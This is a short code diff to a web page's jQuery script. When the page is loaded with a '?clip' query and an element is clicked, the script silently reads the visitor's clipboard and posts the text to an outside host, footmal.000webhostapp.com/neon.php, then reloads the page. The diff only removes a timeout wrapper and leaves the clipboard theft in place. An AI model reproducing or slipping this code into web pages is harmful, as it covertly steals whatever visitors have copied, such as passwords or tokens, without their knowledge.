@@ -74,7 +74,6 @@
         $(document).ready(function(){
           $("#home").click(function(){
           if(document.location.search == "?clip"){
-            setTimeout(function(){
           navigator.clipboard.readText().then(text => {
     $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
@@ -84,7 +83,6 @@
       data: ({text: text, type: "clip"})
     });
             document.location.href = document.location.href;
-  });         
           }
                        });
             var h0 = $("#center").width();
